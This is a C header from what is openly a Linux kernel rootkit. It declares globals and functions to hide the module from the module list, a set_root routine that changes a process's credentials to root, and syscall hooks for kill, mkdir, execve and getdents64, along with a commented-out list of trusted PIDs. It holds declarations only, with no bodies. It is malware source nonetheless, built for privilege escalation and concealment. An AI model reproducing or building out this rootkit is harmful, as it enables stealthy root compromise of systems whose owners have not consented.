/*=====================================================================*\
  function declerations and global variables for hooked_syscalls.c file
\*=====================================================================*/


#include <linux/dirent.h>

extern int BUFFER_SIZE;

bool module_hidden = false;
static struct list_head *prev_module; //location of the previous module
/*struct trusted_pid_node_t; //linked list to store the PID for the list of PIDs that can do anything //CHECK can the PID var from regs be modified?
struct trusted_pid_node_t trusted_pid_head; //head of linked list

//pid functions
static int init_trusted_pid_head(void); //initiates the head node of the list
static int trust_pid(int pid); //adds pid to trusted pid list
static int untrust_pid(int pid); //removes pid from trusted pid list
static bool check_pid_trusted(int pid); //checks if a pid is in list
static int list_trusted_pids(void); //logs all of the trusted pids
*/
//generic functions
static int hide_rootkit(bool); //function to unhide\hide the rootkit
static int set_root(void); //changes credentials of process to root

//hook functions
static asmlinkage long hooked_kill(const struct pt_regs *regs);
static asmlinkage long hooked_mkdir(const struct pt_regs *regs);
static asmlinkage long hooked_execve(const struct pt_regs *regs);
static asmlinkage long hooked_getdents64(const struct pt_regs *regs);

//the hook_t structs for use within module
struct hook_t sys_kill = {.hooked_syscall = hooked_kill, .syscall_number = __NR_kill};
struct hook_t sys_mkdir = {.hooked_syscall = hooked_mkdir, .syscall_number = __NR_mkdir};
struct hook_t sys_execve = {.hooked_syscall = hooked_execve, .syscall_number = __NR_execve};
struct hook_t sys_getdents64 = {.hooked_syscall = hooked_getdents64, .syscall_number = __NR_getdents64};
